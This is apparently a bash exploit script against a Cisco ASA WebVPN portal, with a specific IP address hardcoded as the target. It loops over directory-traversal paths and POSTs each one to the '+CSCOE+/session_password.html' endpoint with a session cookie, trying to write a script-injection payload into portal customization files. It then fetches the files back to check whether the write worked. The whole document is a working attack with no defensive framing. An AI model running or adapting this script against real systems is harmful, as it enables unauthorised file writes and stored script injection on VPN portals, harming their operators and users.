#!/bin/bash

TARGET="https://5.63.66.210"
USER_AGENT="Mozilla/5.0"
COOKIE="webvpnlogin=1; CSCOE_login=1"
CONTENT='<script>alert("owned")</script>'

declare -a paths=(
  "../flash/webvpn_custom.html"
  "../../flash/webvpn_custom.html"
  "../customization/index.html"
  "../../customization/index.html"
  "../../../../../flash/webvpn_custom.html"
  "../../../../../../customization/index.html"
)

mkdir -p exploit_responses

for path in "${paths[@]}"; do
  echo "[*] Trying to write to: $path"
  curl -k -s -X POST "$TARGET/+CSCOE+/session_password.html" \
    -A "$USER_AGENT" \
    -H "Cookie: $COOKIE" \
    --data-urlencode "file_path=$path" \
    --data-urlencode "file_content=$CONTENT" \
    -o "exploit_responses/post_$(echo "$path" | tr '/' '_' | tr '+' '_').html"

  echo "[*] Attempting to read back: $path"
  curl -k -s "$TARGET/+CSCOE+/$(basename "$path")" \
    -A "$USER_AGENT" \
    -H "Cookie: $COOKIE" \
    -o "exploit_responses/get_$(echo "$path" | tr '/' '_' | tr '+' '_').html"
done

echo "[+] Done. Check the 'exploit_responses/' directory for results."
